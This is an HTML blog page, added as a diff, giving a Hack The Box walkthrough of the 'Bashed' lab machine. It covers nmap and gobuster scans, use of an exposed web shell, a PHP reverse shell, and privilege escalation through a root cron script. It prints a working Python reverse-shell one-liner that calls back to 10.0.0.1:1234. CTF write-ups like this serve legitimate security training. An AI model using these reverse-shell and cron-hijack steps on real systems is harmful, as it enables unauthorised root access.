@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Bashed - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Bashed"><a href="#Hack-The-Box-Bashed" class="headerlink" title="Hack The Box - Bashed"></a>Hack The Box - Bashed</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted. Its IP address is <code>10.10.10.68</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/bashed/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bashed)
+ |
+ |-->{SFire129}#nmap -A -v 10.10.10.68
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 12:09 EDT
+ NSE: Loaded 151 scripts for scanning.
+ NSE: Script Pre-scanning.
+ Host is up (0.24s latency).
+ Not shown: 997 closed ports
+ PORT     STATE SERVICE    VERSION
+ 80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+ |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
+ | http-methods:
+ |_  Supported Methods: POST OPTIONS GET HEAD
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ |_http-title: Arrexel's Development Site
+ 9000/tcp open  tcpwrapped
+ 9999/tcp open  tcpwrapped
+ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+ TCP/IP fingerprint:
+ OS:SCAN(V=7.80%E=4%D=5/28%OT=80%CT=1%CU=42705%PV=Y%DS=2%DC=T%G=Y%TM=5ECFE26
+ OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(
+ OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+ OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+ OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+ OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+ OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+ OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+ OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+ OS:S)
+ 
+ Uptime guess: 1.838 days (since Tue May 26 16:04:08 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=254 (Good luck!)
+ IP ID Sequence Generation: All zeros
+ 
+ TRACEROUTE (using port 3389/tcp)
+ HOP RTT      ADDRESS
+ 1   96.99 ms 10.10.14.1
+ 2   97.12 ms 10.10.10.68
+ 
+ NSE: Script Post-scanning.
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 66.87 seconds
+            Raw packets sent: 2099 (96.382KB) | Rcvd: 1227 (52.566KB)<br></figure></pre>
+<img src="/images/hackthebox/exploit/bashed/1.png" alt=""></p>
+<p>The server run a service http in the port 80. Launch <code>Gobuster</code> for list the web server.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/bashed)
+ |
+ |-->{SFire129}#gobuster dir --url http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
+ ===============================================================
+ Gobuster v3.0.1
+ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+ ===============================================================
+ [+] Url:            http://10.10.10.68
+ [+] Threads:        10
+ [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+ [+] Status codes:   200,204,301,302,307,401,403
+ [+] User Agent:     gobuster/3.0.1
+ [+] Timeout:        10s
+ ===============================================================
+ 2020/05/28 12:30:07 Starting gobuster
+ ===============================================================
+ /.hta (Status: 403)
+ /.htaccess (Status: 403)
+ /.htpasswd (Status: 403)
+ /css (Status: 301)
+ /dev (Status: 301)
+ /fonts (Status: 301)
+ /images (Status: 301)
+ /index.html (Status: 200)
+ /js (Status: 301)
+ /php (Status: 301)
+ /server-status (Status: 403)
+ /uploads (Status: 301)
+ ===============================================================
+ 2020/05/28 12:31:39 Finished
+ ===============================================================<br></figure></pre>
+ <p>The scan show differents folders, browse each one.
+ <img src="/images/hackthebox/exploit/bashed/2.png" alt=""></p>
+ <img src="/images/hackthebox/exploit/bashed/4.png" alt=""></p>
+ <p>The next folder show a web-shell interactive commands with users privileges.
+ <img src="/images/hackthebox/exploit/bashed/3.png" alt=""></p>
+ <p>Download from Kali linux machine the script <code>LinEnum.sh</code> for enumerate the OS system.
+ <img src="/images/hackthebox/exploit/bashed/5.png" alt=""></p>
+ <p>The output script, show an user without password.
+ <img src="/images/hackthebox/exploit/bashed/6.png" alt=""></p>
+ <p>Change to directory <code>uploads</code>, for download the scritp <code>php-reverse-shell.php</code> for reverse conection, is better than web shell page work.
+ <img src="/images/hackthebox/exploit/bashed/7.png" alt=""></p>
+ <p>Change the ip address into the <code>php-reverse-shell.php</code> before to download into the machine <code>Bashed</code>
+ <img src="/images/hackthebox/exploit/bashed/8.png" alt=""></p>
+ <p>Download from Kali Linux, the <code>php-reverse-shell.php</code>.
+ <img src="/images/hackthebox/exploit/bashed/9.png" alt=""></p>
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>Run the netcat for reverse shell and get the url with the script.
+ <img src="/images/hackthebox/exploit/bashed/10.png" alt=""></p>
+ <p> With the command <code>sudo -u scritpmanager bash</code> change to user <code>scriptmanager</code>.
+<pre><figure class="highlight plain"> $ python -c 'import pty; pty.spawn("/bin/bash")'
+ www-data@bashed:/$ sudo -u scriptmanager bash
+ sudo -u scriptmanager bash
+ scriptmanager@bashed:/$ id
+ id
+ uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
+ scriptmanager@bashed:/$ ls -la
+ ls -la
+ total 88
+ drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
+ drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
+ drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
+ drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
+ drwxr-xr-x  19 root          root           4240 May 27 15:30 dev
+ drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
+ drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
+ lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
+ drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
+ drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
+ drwx------   2 root          root          16384 Dec  4  2017 lost+found
+ drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
+ drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
+ drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
+ dr-xr-xr-x 160 root          root              0 May 27 15:30 proc
+ drwx------   3 root          root           4096 Dec  4  2017 root
+ drwxr-xr-x  18 root          root            520 May 28 06:25 run
+ drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
+ drwxrwxr--   2 scriptmanager scriptmanager  4096 May 27 17:16 scripts
+ drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+ dr-xr-xr-x  13 root          root              0 May 27 15:49 sys
+ drwxrwxrwt  10 root          root           4096 May 28 12:45 tmp
+ drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
+ drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
+ lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
+ scriptmanager@bashed:/$</figure></pre>
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get Privileges"></a>Get Privileges</h2>
+ <p>Inside of the folder <code>scripts</code> There are two files, looks like task schedule.
+ <pre><figure class="highlight plain"> scriptmanager@bashed:/scripts$ ls
+ ls
+ test.py  test.txt
+ scriptmanager@bashed:/scripts$ ls -la
+ ls -la
+ total 52
+ drwxrwxr--  2 scriptmanager scriptmanager  4096 May 28 13:18 .
+ drwxr-xr-x 23 root          root           4096 Dec  4  2017 ..
+ -rw-r--r--  1 scriptmanager scriptmanager   213 May 28 13:13 test.py
+ -rw-r--r--  1 root          root             12 May 27 15:57 test.txt
+ scriptmanager@bashed:/scripts$</figure></pre>
+ <p>In Kali linux machine, create a file with the name test1.py with the next script for reverse shell inside: <code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])</code> and download in the scripts folder, then replace the test1.py for test.py file. NOTE:Don't forget fix the script with your own ip address for reverse conection and port.
+  <img src="/images/hackthebox/exploit/bashed/12.png" alt=""></p>
+ <p>Run the netcat listener, in my case over port 1234 and wait for the reverse conection with root privileges.
+ <img src="/images/hackthebox/exploit/bashed/13.png" alt=""></p>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain">  # python -c 'import pty; pty.spawn("/bin/bash")'
+ root@bashed:/home# ls
+ ls
+ arrexel  scriptmanager
+ root@bashed:/home# cd arrexel
+ cd arrexel
+ root@bashed:/home/arrexel# ls
+ ls
+ user.txt
+ root@bashed:/home/arrexel# cat user.txt
+ cat user.txt
+ ***Here you could be find the user flag***
+ root@bashed:/home/arrexel# cd /root/
+ cd /root/
+ root@bashed:~# cat root.txt
+ cat root.txt
+ ***Here you could be find the root flag***
+ root@bashed:~#</figure></pre>
+
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-28</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Eternalbashed</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
